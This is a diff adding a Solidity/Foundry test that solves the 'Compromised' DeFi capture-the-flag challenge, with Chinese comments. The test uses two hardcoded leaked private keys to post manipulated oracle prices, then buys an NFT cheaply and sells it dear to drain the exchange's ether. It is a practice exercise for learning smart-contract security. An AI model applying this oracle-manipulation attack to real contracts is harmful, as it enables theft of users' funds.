@@ -75,7 +75,88 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+          // 直接从HTTP响应解码得到的私钥
+        // 这些私钥从hex字符串解码得到
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744; // 第一个私钥
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159; // 第二个私钥
         
+        address source1 = vm.addr(privateKey1);
+        address source2 = vm.addr(privateKey2);
+        
+        console.log("Source 1 address:", source1);
+        console.log("Source 2 address:", source2);
+        
+        // 验证地址匹配题目中的trusted sources
+        assertEq(source1, sources[0], "Source 1 mismatch");
+        assertEq(source2, sources[1], "Source 2 mismatch");
+        
+        // 开始攻击
+        
+        // 1. 用私钥设置低价
+        vm.startBroadcast(privateKey1);
+        oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopBroadcast();
+        
+        vm.startBroadcast(privateKey2);
+        oracle.postPrice("DVNFT",PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopBroadcast();
+        
+        // 2. 低价购买
+        vm.startPrank(player);
+         uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+        vm.stopPrank();
+        
+        // 3. 恢复原价
+        vm.startBroadcast(privateKey1);
+        oracle.postPrice("DVNFT", 999.1 ether);
+        vm.stopBroadcast();
+        
+        vm.startBroadcast(privateKey2);
+        oracle.postPrice("DVNFT", 999.1 ether);
+        vm.stopBroadcast();
+        
+        // 4. 高价卖出
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+        
+        // // 5. 再次降低价格到交易所剩余余额
+        // uint256 exchangeBalance = address(exchange).balance;
+        // vm.startBroadcast(privateKey1);
+        // oracle.postPrice("DVNFT", exchangeBalance);
+        // vm.stopBroadcast();
+        
+        // vm.startBroadcast(privateKey2);
+        // oracle.postPrice("DVNFT", exchangeBalance);
+        // vm.stopBroadcast();
+        
+        // // 6. 购买剩余NFT
+        // vm.startPrank(player);
+        // exchange.buyOne{value: exchangeBalance}();
+        // vm.stopPrank();
+        
+        // 7. 恢复价格
+        vm.startBroadcast(privateKey1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopBroadcast();
+        
+        vm.startBroadcast(privateKey2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopBroadcast();
+        
+        // // 8. 卖出第二个NFT
+        // vm.startPrank(player);
+        // uint256 tokenId2 = 1;
+        // nft.approve(address(exchange), tokenId2);
+        // exchange.sellOne(tokenId2);
+        // vm.stopPrank();
+        
+        // 9. 转移资金
+        vm.startPrank(player);
+        (bool success, ) = recovery.call{value: 999 ether}("");
+        require(success, "Transfer failed");
+        vm.stopPrank();
     }
 
     /**
